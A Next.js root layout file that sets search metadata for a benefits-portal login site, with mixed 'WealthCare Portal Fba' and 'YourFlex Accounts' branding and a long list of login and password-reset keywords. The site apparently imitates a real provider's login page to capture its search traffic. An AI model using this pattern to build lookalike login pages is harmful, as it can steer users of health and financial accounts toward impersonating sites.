import type React from "react";
import type { Metadata } from "next";
import { Geist } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import "./globals.css";

const geist = Geist({ subsets: ["latin"] });

const CANONICAL_LOGIN_URL =
  "https://fba.wealthcareportal.com/Authentication/Handshake";
const SITE_DOMAIN = "fba.wealthcareportal.com";
const SITE_BRAND = "WealthCare Portal Fba";

export const metadata: Metadata = {
  metadataBase: new URL(
    process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
  ),
  title: {
    default: "WealthCare Portal Fba - Login",
    template: "%s | WealthCare Portal Fba",
  },
  keywords: [
  "FlexBenefitAdministrator",
  "Flex Benefit Administrator",
  "FlexBenefit Administrator login",
  "FlexBenefitAdministrator login",
  "FlexBenefitAdministrator benefits",
  "FlexBenefitAdministrator benefits portal",
  "FlexBenefitAdministrator employee benefits",
  "FlexBenefitAdministrator employee portal",
  "FlexBenefitAdministrator participant portal",
  "FlexBenefitAdministrator employer portal",
  "FlexBenefitAdministrator secure login",
  "FlexBenefitAdministrator account access",
  "FlexBenefitAdministrator online account",
  "FlexBenefitAdministrator reimbursement account",
  "FlexBenefitAdministrator benefits management",
  "FlexBenefitAdministrator participant login",
  "FlexBenefitAdministrator employer login",
  "FlexBenefitAdministrator healthcare portal",
  "WealthCare Portal FBA",
  "FBA WealthCare Portal",
  "fba.wealthcareportal.com",
  "WealthCare Portal",
  "WealthCare benefits portal",
  "WealthCare participant portal",
  "WealthCare employer portal",
  "WealthCare secure login",
  "WealthCare account access",
  "benefits login",
  "employee benefits login",
  "employee benefits portal",
  "secure benefits login",
  "participant portal login",
  "employer portal login",
  "account access login",
  "online benefits account login",
  "secure portal access",
  "health benefits",
  "health benefits login",
  "health savings account management",
  "HSA login",
  "secure HSA account login",
  "FSA login",
  "dependent care FSA login",
  "dependent care reimbursement account",
  "reimbursement account",
  "healthcare reimbursement account",
  "medical expense reimbursement portal",
  "COBRA login",
  "COBRA administration services",
  "COBRA continuation coverage portal",
  "employee benefits administration",
  "benefit administration",
  "benefits administration services",
  "flexible benefits",
  "flexible benefits administration",
  "online employee benefits platform",
  "employer benefits management",
  "third-party benefits administrator",
  "secure employee benefits portal",
  "benefits management platform",
  "how to access my FSA account online",
  "how to submit reimbursement claims",
  "how to manage HSA online",
  "how to check HSA balance",
  "how to access employee benefits portal",
  "how to file reimbursement claims online",
  "how to use a reimbursement account",
  "eligible FSA expenses",
  "benefits portal login issues",
  "forgot benefits portal password",
  "secure employee portal access",
  "participant portal authentication help",
  "benefits portal password reset",
  "handshake authentication",
  "handshake authentication login",
  "secure portal authentication",
  "two-factor authentication benefits portal",
  "employee portal verification",
  "secure reimbursement account access",
  "participant portal security",
  "account recovery portal login"
],
  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,

  authors: [{ name: "WealthCare Portal Fba" }],
  creator: "WealthCare Portal Fba",
  publisher: "WealthCare Portal Fba",
  applicationName: SITE_BRAND,
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    title: "YourFlex Accounts - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
    siteName: SITE_BRAND,
    url: CANONICAL_LOGIN_URL,
    images: [
      {
        url: "/favicon-32x32.png",
        width: 32,
        height: 32,
        alt: `${SITE_BRAND}`,
      },
    ],
  },
  twitter: {
    card: "summary",
    title: "YourFlex Accounts - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
    images: ["/favicon-32x32.png"],
  },
  icons: {
    icon: "/favicon-32x32.png",
    shortcut: "/favicon-32x32.png",
    apple: "/favicon-32x32.png",
  },
  viewport: {
    width: "device-width",
    initialScale: 1,
    maximumScale: 5,
  },
  themeColor: "#254650",
  category: "Business",
  alternates: {
    canonical: CANONICAL_LOGIN_URL,
    languages: {
      "en-US": CANONICAL_LOGIN_URL,
    },
  },
  other: {
    "geo.region": "US",
  },
};

const jsonLd = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  name: SITE_BRAND,
  url: CANONICAL_LOGIN_URL,
  description:
    "YourFlex Accounts sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your YourFlex Accounts profile.",
  publisher: {
    "@type": "Organization",
    name: "YourFlex Accounts",
  },
  inLanguage: "en-US",
  potentialAction: {
    "@type": "SearchAction",
    target: { "@type": "EntryPoint", url: CANONICAL_LOGIN_URL },
    "query-input": "required name=search_term_string",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en-US">
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body className={`${geist.className} font-sans antialiased`}>
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
        {children}
        <Analytics />
      </body>
    </html>
  );
}
